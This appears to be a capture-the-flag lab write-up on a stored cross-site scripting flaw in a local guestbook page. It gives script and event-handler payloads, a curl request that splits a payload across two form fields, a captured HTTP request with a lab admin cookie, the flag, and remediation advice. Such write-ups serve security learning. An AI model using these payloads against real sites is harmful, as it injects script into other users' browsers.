# Cross-Site Scripting (XSS)

## Vulnerability Type
**OWASP A03:2021 - Injection** (CWE-79: Improper Neutralization of Input During Web Page Generation)

page: `http://localhost:8081/index.php?page=feedback`
commands: In the guestbook form, enter in the **Name** field:

```txt
test
# and in the **Message** field:
<script>alert('XSS')</script>
```

Or via curl:

```bash
curl -X POST "http://localhost:8081/index.php?page=feedback" \
     -d "txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook" | grep flag
```

## Details

This is a **Stored XSS** (also called Persistent XSS). There are 3 types:

| Type | How it works | Example |
|---|---|---|
| **Stored** (Persistent) | Payload is saved on the server (database). Every user who views the page gets hit. | Guestbook comment with `<script>` — this exploit ✅ |
| **Reflected** (Non-Persistent) | Payload is in the URL/request and immediately bounced back in the response. Only affects who clicks the link. | `search.php?q=<script>alert(1)</script>` |
| **DOM-based** | Payload never reaches the server. JavaScript on the page reads from the URL/DOM and unsafely inserts it. | `page.html#<img onerror=alert(1)>` |

This guestbook is **Stored XSS** because the `<script>` tag is saved in the database and rendered for every visitor who loads the page.

I entered a <script>alert('XSS')</script in the comment box and got the flag

The flag is : 0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e

## Key Failures

1. **No input sanitization** – User input (name and message) is stored as-is in the database
2. **No output encoding** – Comments are rendered directly in HTML without escaping
3. **No Content Security Policy** – No CSP header to restrict script execution
4. **Stored in database** – Makes it persistent; every user is affected
5. **No HTML/script filtering** – Application doesn't strip or validate HTML tags

## Remediation

1. **Output encoding** – Always HTML-encode user input before rendering:

```php
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

This converts `<script>` to `&lt;script&gt;` so browsers render it as text, not code.

2. **Input validation** – Whitelist allowed characters (alphanumeric, spaces, basic punctuation):

```php
if (!preg_match('/^[a-zA-Z0-9\s.,!?-]+$/', $input)) {
     die('Invalid input');
}
```

3. **Content Security Policy (CSP)** – Add HTTP header to block inline
scripts:
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

4. **Use templating engines** – Modern frameworks (Twig, Vue, React) auto-escape by default

5. **Filter on input, encode on output** – Accept any input, but sanitize when rendering

6. **Regular security testing** – Scan for XSS payloads:
   ```
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>
   javascript:alert(1)
   ```
POST /index.php?page=feedback HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 91
Origin: http://localhost:8081
Connection: keep-alive
Referer: http://localhost:8081/index.php?page=feedback
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

txtName=%3Cscript%3Eal&mtxtMessage=ert%28%27XSS%27%29%3C%2Fscript%3E&btnSign=Sign+Guestbook

